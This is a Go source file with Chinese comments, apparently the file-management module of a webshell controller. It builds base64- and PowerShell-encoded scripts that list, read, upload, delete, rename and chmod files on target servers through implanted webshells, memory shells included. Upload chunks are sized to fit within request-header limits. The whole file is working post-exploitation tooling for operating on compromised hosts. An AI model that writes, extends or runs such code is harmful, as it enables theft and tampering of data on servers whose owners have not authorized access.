package webshell

// 文件管理：把一次文件操作编成一段目标侧脚本，经**现有命令通道**交给马执行。
//
// 之所以不新增一套马协议：php/jsp/asp/aspx 与内存马都能跑系统命令，脚本在目标的
// /bin/sh 或 PowerShell 里执行即可，用户不用换马（内存马尤其没法随手重注入）。
// 输出统一用「制表符分隔 + 文件名 base64」回传：不依赖 JSON 转义，也不怕中文、
// 空格、引号、换行这些目标上常见的文件名。
//
// 所有路径与内容都以 base64 嵌入脚本，不参与 shell 字符串拼接。

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"strings"
	"time"
	"unicode/utf16"
)

// 目标系统取值（与 webshells.os_type 一致）。
const (
	OSLinux   = "linux"
	OSWindows = "windows"
)

// 文件操作名。server 侧按白名单分发。
const (
	FsList   = "list"
	FsRead   = "read"
	FsWrite  = "write"
	FsMkdir  = "mkdir"
	FsDelete = "delete"
	FsRename = "rename"
	FsChmod  = "chmod"
)

// 单次读取的默认上限：响应体整体还有 4MB 限制，base64 膨胀 4/3，留出余量。
const (
	DefaultReadLimit = 2 << 20
	maxReadLimit     = 3 << 20
	maxUploadBytes   = 8 << 20 // 上传硬上限（前端还有更低的默认值）
	// 分块大小按「原始字节」算：Linux 受 MAX_ARG_STRLEN(128KB) 限制，Windows 受
	// cmd 命令行 8191 字符限制——脚本要再经 UTF-16 + base64 膨胀约 3.6 倍，且脚本里
	// 还要带一长串临时文件路径，所以块压到 1200 字节（近 MAX_PATH 时仍留 ~1KB 余量）。
	linuxChunkBytes   = 48 << 10
	windowsChunkBytes = 1200
	// 请求头触发型把整段脚本塞进一个请求头，Web 容器普遍在 8KB 左右掐断。
	maxHeaderCommandBytes = 6000
)

var (
	ErrFSUnknownOS    = errors.New("无法判断目标系统，请先在编辑里把「目标系统」设为 Linux 或 Windows")
	ErrFSReadTooBig   = errors.New("文件超过单次读取上限")
	ErrFSTooBig       = errors.New("文件超过单次上传上限")
	ErrFSWindowsOnly  = errors.New("该操作在 Windows 目标上不可用")
	ErrFSHeaderTooBig = errors.New("该马通过请求头传命令，单条约 6KB；请改用参数触发型或命令型马，或减小分块")
	ErrFSBadScript    = errors.New("文件操作正在执行但脚本没有回传结果（马不支持命令执行或被拦截）")
)

// FSEntry 是目录里的一项。
type FSEntry struct {
	Name  string `json:"name"`
	Dir   bool   `json:"dir"`
	Link  string `json:"link,omitempty"`
	Size  int64  `json:"size"`
	Mode  string `json:"mode,omitempty"`
	MTime int64  `json:"mtime"`
}

// FSList 是一次目录列举的结果。Path 是规范化后的目标路径，Parent 为空表示已在根。
type FSList struct {
	Path    string    `json:"path"`
	Parent  string    `json:"parent"`
	Entries []FSEntry `json:"entries"`
}

// FSRead 是一次文件读取的结果。Data 是原始字节，前端自行决定按文本还是下载处理。
type FSRead struct {
	Path string `json:"path"`
	Size int64  `json:"size"`
	Data []byte `json:"-"`
}

// FSRequest 描述一次文件操作。
type FSRequest struct {
	Op        string
	Path      string
	From      string
	To        string
	Content   []byte
	Mode      string
	Recursive bool
	MaxBytes  int64
}

type fsSession struct {
	ctx     context.Context
	target  *Target
	os      string
	timeout time.Duration
}

// run 把脚本交给目标执行并返回其标准输出。脚本内部非零退出不算错——错误一律以
// 「ERROR:」开头的文本回传，方便把目标侧的真实原因带给用户。
func (s *fsSession) run(script string) (string, error) {
	cmd := fsCommand(s.os, script)
	if s.target.Type == TypeJSPMemoryHeader && len(cmd) > maxHeaderCommandBytes {
		return "", ErrFSHeaderTooBig
	}
	return ExecScript(s.ctx, s.target, cmd, s.timeout)
}

// runExpectOK 用于只关心成败的操作。
func (s *fsSession) runExpectOK(script string) error {
	out, err := s.run(script)
	if err != nil {
		return err
	}
	line := strings.TrimSpace(out)
	if strings.HasPrefix(line, "ERROR:") {
		return errors.New(strings.TrimPrefix(line, "ERROR:"))
	}
	if line == "" || !strings.Contains(line, "OK") {
		return ErrFSBadScript
	}
	return nil
}

func fsCommand(os, script string) string {
	if os == OSWindows {
		// 先切 UTF-8 输出，否则中文 Windows 上的 error/info 会按 GBK 回传，前端显示乱码。
		// -EncodedCommand 收 UTF-16LE，脚本里的中文路径不会因代码页丢字。
		return "powershell -NoProfile -NonInteractive -EncodedCommand " + encodeUTF16B64(psUTF8Output+script)
	}
	return "printf %s '" + base64.StdEncoding.EncodeToString([]byte(script)) + "' | base64 -d | sh"
}

// psUTF8Output 在控制台句柄不可用（服务方式运行）时会失败，失败也不影响脚本本身。
// $ErrorActionPreference='Stop' 让 Remove-Item/Move-Item 之类的非终止错误进入 catch，
// 否则删不存在的文件会静默返回成功。
const psUTF8Output = `try{[Console]::OutputEncoding=[Text.Encoding]::UTF8}catch{};$ErrorActionPreference='Stop';`

func encodeUTF16B64(s string) string {
	u := utf16.Encode([]rune(s))
	b := make([]byte, 0, len(u)*2)
	for _, r := range u {
		b = append(b, byte(r), byte(r>>8))
	}
	return base64.StdEncoding.EncodeToString(b)
}

// b64 把字符串编成可安全嵌进单引号 shell 字面量的 base64。
func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// shVar 生成 `name=$(printf %s 'b64' | base64 -d)` 的解码赋值。
func shVar(name, value string) string {
	return name + "=$(printf %s '" + b64(value) + "' | base64 -d 2>/dev/null)"
}

// psVar 生成 `$name=...FromBase64String('b64')` 的解码赋值（UTF-8）。
func psVar(name, value string) string {
	return "$" + name + "=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + b64(value) + "'))"
}

// isWindowsRoot 判断是否某个盘符的根（C:\、D:\）或 UNC 根，删除这些没有意义。
func isWindowsRoot(p string) bool {
	if len(p) == 3 && p[1] == ':' && p[2] == '\\' {
		return true
	}
	return p == `\` || p == `\\`
}

// NormalizeFSPath 按目标系统的习惯补齐空路径、统一分隔符。文件管理只在这里
// 处理路径形态，脚本里拿到的已是可直接用的字符串。
func NormalizeFSPath(os, p string) string {
	p = strings.TrimSpace(p)
	if os == OSWindows {
		p = strings.ReplaceAll(p, "/", `\`)
		if p == "" {
			return `C:\`
		}
		if len(p) == 2 && p[1] == ':' {
			return p + `\`
		}
		return p
	}
	if p == "" {
		return "/"
	}
	return p
}

// ParentFSPath 返回上一级；已在根上时返回空串（前端据此禁用「上级」）。
func ParentFSPath(os, p string) string {
	p = NormalizeFSPath(os, p)
	if os == OSWindows {
		trimmed := strings.TrimRight(p, `\`)
		i := strings.LastIndexByte(trimmed, '\\')
		if i < 0 {
			return ""
		}
		if i == 2 && len(trimmed) >= 3 && trimmed[1] == ':' {
			return trimmed[:3]
		}
		return trimmed[:i]
	}
	if p == "/" {
		return ""
	}
	trimmed := strings.TrimRight(p, "/")
	i := strings.LastIndexByte(trimmed, '/')
	if i <= 0 {
		return "/"
	}
	return trimmed[:i]
}

// List 列目录。
func List(ctx context.Context, t *Target, os, path string, timeout time.Duration) (*FSList, error) {
	s := &fsSession{ctx: ctx, target: t, os: os, timeout: timeout}
	p := NormalizeFSPath(os, path)
	out, err := s.run(fsListScript(os, p))
	if err != nil {
		return nil, err
	}
	entries, err := parseFSEntries(out)
	if err != nil {
		return nil, err
	}
	return &FSList{Path: p, Parent: ParentFSPath(os, p), Entries: entries}, nil
}

// Read 读文件（整体，带上限）。
func Read(ctx context.Context, t *Target, os, path string, maxBytes int64, timeout time.Duration) (*FSRead, error) {
	if maxBytes <= 0 {
		maxBytes = DefaultReadLimit
	}
	if maxBytes > maxReadLimit {
		maxBytes = maxReadLimit
	}
	s := &fsSession{ctx: ctx, target: t, os: os, timeout: timeout}
	p := NormalizeFSPath(os, path)
	out, err := s.run(fsReadScript(os, p, maxBytes))
	if err != nil {
		return nil, err
	}
	out = strings.TrimSpace(out)
	if strings.HasPrefix(out, "ERROR:") {
		return nil, errors.New(strings.TrimPrefix(out, "ERROR:"))
	}
	raw, err := base64.StdEncoding.DecodeString(stripSpace(out))
	if err != nil {
		return nil, ErrFSBadScript
	}
	return &FSRead{Path: p, Size: int64(len(raw)), Data: raw}, nil
}

// Write 分批把内容写进目标文件：先把 base64 文本追加到同目录临时文件，最后一次
// 解码成目标文件再删临时文件。Linux 单条命令受 MAX_ARG_STRLEN(128KB) 限制、
// Windows 受 cmd 命令行 8KB 限制，所以必须分块而不是一把梭。
func Write(ctx context.Context, t *Target, os, path string, content []byte, timeout time.Duration) error {
	if len(content) > maxUploadBytes {
		return ErrFSTooBig
	}
	s := &fsSession{ctx: ctx, target: t, os: os, timeout: timeout}
	dst := NormalizeFSPath(os, path)
	if len(content) == 0 {
		return s.runExpectOK(fsCreateEmptyScript(os, dst))
	}
	tmp := fsTempPath(os, dst)
	enc := base64.StdEncoding.EncodeToString(content)

	rawChunk := linuxChunkBytes
	if os == OSWindows {
		rawChunk = windowsChunkBytes
	}
	// 请求头触发型把脚本塞进一个请求头，块要再小一号，否则会被容器直接拒掉。
	if t.Type == TypeJSPMemoryHeader {
		rawChunk = 3000
	}
	// 第三方加密马用请求头传命令，且脚本还要被加密层整体放大一次，块再压一档。
	// 自研加密通道走请求体，不受请求头上限约束，沿用原生块大小。
	if IsThirdPartyType(t.Type) {
		if os == OSWindows {
			rawChunk = 500
		} else {
			rawChunk = 1800
		}
	}
	encChunk := 4 * ((rawChunk + 2) / 3)

	first := true
	for len(enc) > 0 {
		n := encChunk
		if n > len(enc) {
			n = len(enc)
		}
		part := enc[:n]
		enc = enc[n:]
		var script string
		if os == OSWindows {
			script = fsWinAppendScript(tmp, part, first)
		} else {
			script = fsShAppendScript(tmp, part, first)
		}
		if err := s.runExpectOK(script); err != nil {
			return err
		}
		first = false
	}
	return s.runExpectOK(fsFinishWriteScript(os, tmp, dst))
}

func fsTempPath(os, dst string) string {
	dir := ParentFSPath(os, dst)
	sep := "/"
	if os == OSWindows {
		sep = `\`
	}
	if dir == "" {
		dir = sep
	}
	name := ".artex_up_" + fmt.Sprintf("%d", time.Now().UnixNano()) + ".b64"
	if strings.HasSuffix(dir, sep) {
		return dir + name
	}
	return dir + sep + name
}

// Mkdir 建目录（含父级）。
func Mkdir(ctx context.Context, t *Target, os, path string, timeout time.Duration) error {
	s := &fsSession{ctx: ctx, target: t, os: os, timeout: timeout}
	return s.runExpectOK(fsMkdirScript(os, NormalizeFSPath(os, path)))
}

// Remove 删除文件或目录；recursive 为 false 时目录只删空目录。
func Remove(ctx context.Context, t *Target, os, path string, recursive bool, timeout time.Duration) error {
	s := &fsSession{ctx: ctx, target: t, os: os, timeout: timeout}
	p := NormalizeFSPath(os, path)
	if p == "/" || (os == OSWindows && isWindowsRoot(p)) {
		return errors.New("不允许删除根目录")
	}
	return s.runExpectOK(fsRemoveScript(os, p, recursive))
}

// Rename 重命名 / 移动。
func Rename(ctx context.Context, t *Target, os, from, to string, timeout time.Duration) error {
	s := &fsSession{ctx: ctx, target: t, os: os, timeout: timeout}
	return s.runExpectOK(fsRenameScript(os, NormalizeFSPath(os, from), NormalizeFSPath(os, to)))
}

// Chmod 改权限（八进制，如 644）。Windows 没有对应语义，明确报错而不是假装成功。
func Chmod(ctx context.Context, t *Target, os, path, mode string, timeout time.Duration) error {
	mode = strings.TrimPrefix(strings.TrimSpace(mode), "0")
	if mode == "" || strings.Trim(mode, "01234567") != "" || len(mode) > 4 {
		return errors.New("权限应为八进制数字，如 644")
	}
	if os == OSWindows {
		return ErrFSWindowsOnly
	}
	s := &fsSession{ctx: ctx, target: t, os: os, timeout: timeout}
	return s.runExpectOK(fsChmodScript(NormalizeFSPath(os, path), mode))
}

// DetectOS 用一条与系统无关的命令探测目标系统：cmd 会把 %OS% 展开成 Windows_NT，
// sh 则原样回显 %OS%。探测结果由调用方回写 webshells.os_type。
func DetectOS(ctx context.Context, t *Target, timeout time.Duration) (string, error) {
	out, err := Exec(ctx, t, "echo %OS%", timeout)
	if err != nil {
		return "", err
	}
	if !out.Parsed {
		return "", ErrFSBadScript
	}
	if strings.Contains(strings.ToUpper(out.Output), "WINDOWS_NT") {
		return OSWindows, nil
	}
	if out.Output == "" {
		return "", ErrFSUnknownOS
	}
	return OSLinux, nil
}

// ---- 脚本生成 ----

func fsListScript(os, p string) string {
	if os == OSWindows {
		return `try {
` + psVar("p", p) + `
  $items=Get-ChildItem -LiteralPath $p -Force
} catch { "ERROR:"+$_.Exception.Message; exit 0 }
foreach($i in $items){
  $t=if($i.PSIsContainer){'d'}elseif($i.LinkType){'l'}else{'f'}
  $s=if($i.PSIsContainer){0}else{$i.Length}
  $m=[int64]([DateTimeOffset]($i.LastWriteTimeUtc)).ToUnixTimeSeconds()
  $n=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($i.Name))
  $l=''
  if($i.LinkType){$l=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([string]$i.Target))}
  "$t` + "\t" + `$s` + "\t" + `$m` + "\t" + "\t" + `$n` + "\t" + `$l"
}`
	}
	return shVar("p", p) + `
[ -d "$p" ] || { echo 'ERROR:目录不存在或不是目录'; exit 0; }
cd "$p" 2>/dev/null || { echo 'ERROR:无法进入目录（权限不足）'; exit 0; }
for f in .* *; do
  case "$f" in .|..) continue;; esac
  if [ -L "$f" ]; then ty=l; elif [ -d "$f" ]; then ty=d; elif [ -f "$f" ]; then ty=f; else continue; fi
  s=$(stat -c %s "$f" 2>/dev/null); [ -n "$s" ] || s=0
  m=$(stat -c %Y "$f" 2>/dev/null); [ -n "$m" ] || m=0
  a=$(stat -c %a "$f" 2>/dev/null)
  n=$(printf %s "$f" | base64 2>/dev/null | tr -d '\n')
  l=
  if [ "$ty" = l ]; then l=$(readlink "$f" 2>/dev/null | base64 2>/dev/null | tr -d '\n'); fi
  printf '%s` + "\t" + `%s` + "\t" + `%s` + "\t" + `%s` + "\t" + `%s` + "\t" + `%s\n' "$ty" "$s" "$m" "$a" "$n" "$l"
done`
}

func fsReadScript(os, p string, limit int64) string {
	if os == OSWindows {
		return `$ErrorActionPreference='Stop'
try {
` + psVar("p", p) + `
  $fi=Get-Item -LiteralPath $p -Force
  if($fi.PSIsContainer){'ERROR:这是一个目录'; exit 0}
  if($fi.Length -gt ` + fmt.Sprint(limit) + `){'ERROR:文件 '+$fi.Length+' 字节，超过单次读取上限'}else{[Convert]::ToBase64String([IO.File]::ReadAllBytes($p))}
} catch { "ERROR:"+$_.Exception.Message }`
	}
	return shVar("p", p) + `
[ -f "$p" ] || { echo 'ERROR:文件不存在或不是普通文件'; exit 0; }
s=$(stat -c %s "$p" 2>/dev/null); [ -n "$s" ] || s=0
if [ "$s" -gt ` + fmt.Sprint(limit) + ` ]; then echo "ERROR:文件 $s 字节，超过单次读取上限"; exit 0; fi
b=$(base64 "$p" 2>/dev/null | tr -d '\n')
[ -n "$b" ] || { echo 'ERROR:读取失败（权限不足或文件为空）'; exit 0; }
printf %s "$b"`
}

func fsShAppendScript(tmp, part string, first bool) string {
	redir := ">"
	if !first {
		redir = ">>"
	}
	return shVar("f", tmp) + `
printf %s '` + part + `' ` + redir + ` "$f" 2>/dev/null && echo OK || echo 'ERROR:写入临时文件失败（目录不可写？）'`
}

func fsWinAppendScript(tmp, part string, first bool) string {
	method := "AppendAllText"
	if first {
		method = "WriteAllText"
	}
	return `try{
` + psVar("f", tmp) + `
  [IO.File]::` + method + `($f,'` + part + `')
  'OK'
}catch{"ERROR:"+$_.Exception.Message}`
}

func fsCreateEmptyScript(os, dst string) string {
	if os == OSWindows {
		return `try{
` + psVar("d", dst) + `
  [IO.File]::WriteAllBytes($d,(New-Object byte[] 0))
  'OK'
}catch{"ERROR:"+$_.Exception.Message}`
	}
	return shVar("d", dst) + `
: > "$d" 2>/dev/null && echo OK || echo 'ERROR:创建空文件失败（目录不可写？）'`
}

func fsFinishWriteScript(os, tmp, dst string) string {
	if os == OSWindows {
		return `try{
` + psVar("s", tmp) + `
` + psVar("d", dst) + `
  $b=[Convert]::FromBase64String([IO.File]::ReadAllText($s))
  [IO.File]::WriteAllBytes($d,$b)
  Remove-Item -LiteralPath $s -Force
  'OK'
}catch{Remove-Item -LiteralPath $s -Force -ErrorAction SilentlyContinue; "ERROR:"+$_.Exception.Message}`
	}
	return shVar("s", tmp) + "\n" + shVar("d", dst) + `
if base64 -d "$s" > "$d" 2>/dev/null; then rm -f "$s"; echo OK; else rm -f "$s"; echo 'ERROR:落盘失败（base64 解码失败或目录不可写）'; fi`
}

func fsMkdirScript(os, p string) string {
	if os == OSWindows {
		// New-Item 没有 -LiteralPath，方括号/通配符会出问题；CreateDirectory 对待路径是字面的。
		return `try{
` + psVar("d", p) + `
  [IO.Directory]::CreateDirectory($d) | Out-Null
  'OK'
}catch{"ERROR:"+$_.Exception.Message}`
	}
	return shVar("p", p) + `
mkdir -p -- "$p" 2>/dev/null && echo OK || echo 'ERROR:创建目录失败（检查权限或同名文件）'`
}

func fsRemoveScript(os, p string, recursive bool) string {
	if os == OSWindows {
		flag := "-Force"
		if recursive {
			flag = "-Recurse -Force"
		}
		return `try{Remove-Item -LiteralPath ` + psLiterals(p) + ` ` + flag + `; 'OK'}catch{"ERROR:"+$_.Exception.Message}`
	}
	if recursive {
		return shVar("p", p) + `
rm -rf -- "$p" 2>/dev/null && echo OK || echo 'ERROR:删除失败（检查路径是否存在与权限）'`
	}
	return shVar("p", p) + `
if [ -d "$p" ] && [ ! -L "$p" ]; then rmdir -- "$p" 2>/dev/null; else rm -f -- "$p" 2>/dev/null; fi
[ -e "$p" ] || [ -L "$p" ] && echo 'ERROR:删除失败（目录非空或权限不足）' || echo OK`
}

func fsRenameScript(os, a, b string) string {
	if os == OSWindows {
		return `try{Move-Item -LiteralPath ` + psLiterals(a) + ` -Destination ` + psLiterals(b) + ` -Force; 'OK'}catch{"ERROR:"+$_.Exception.Message}`
	}
	return shVar("a", a) + "\n" + shVar("b", b) + `
mv -- "$a" "$b" 2>/dev/null && echo OK || echo 'ERROR:重命名失败（目标已存在或权限不足）'`
}

func fsChmodScript(p, mode string) string {
	return shVar("p", p) + `
chmod ` + mode + ` -- "$p" 2>/dev/null && echo OK || echo 'ERROR:修改权限失败（检查文件是否存在）'`
}

// psLiterals 把路径包成 PowerShell 单引号字面量（路径只含用户提供的字符，单引号
// 需要用两个单引号转义）。
func psLiterals(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

// ---- 输出解析 ----

func parseFSEntries(out string) ([]FSEntry, error) {
	out = strings.TrimSpace(out)
	if out == "" {
		return []FSEntry{}, nil
	}
	if strings.HasPrefix(out, "ERROR:") {
		return nil, errors.New(strings.TrimPrefix(out, "ERROR:"))
	}
	entries := make([]FSEntry, 0, 32)
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSuffix(line, "\r")
		if strings.TrimSpace(line) == "" {
			continue
		}
		fields := strings.Split(line, "\t")
		if len(fields) < 5 {
			continue
		}
		name, err := base64.StdEncoding.DecodeString(fields[4])
		if err != nil || len(name) == 0 {
			continue
		}
		e := FSEntry{Name: string(name), Dir: fields[0] == "d", Mode: fields[3]}
		e.Size, _ = parseInt64(fields[1])
		e.MTime, _ = parseInt64(fields[2])
		if len(fields) > 5 && fields[5] != "" {
			if link, err := base64.StdEncoding.DecodeString(fields[5]); err == nil {
				e.Link = string(link)
			}
		}
		entries = append(entries, e)
	}
	if len(entries) == 0 && strings.Contains(out, "ERROR:") {
		return nil, ErrFSBadScript
	}
	return entries, nil
}

func parseInt64(s string) (int64, error) {
	var n int64
	if s == "" {
		return 0, nil
	}
	_, err := fmt.Sscan(s, &n)
	return n, err
}

func stripSpace(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); i++ {
		switch s[i] {
		case ' ', '\n', '\r', '\t':
		default:
			b.WriteByte(s[i])
		}
	}
	return b.String()
}
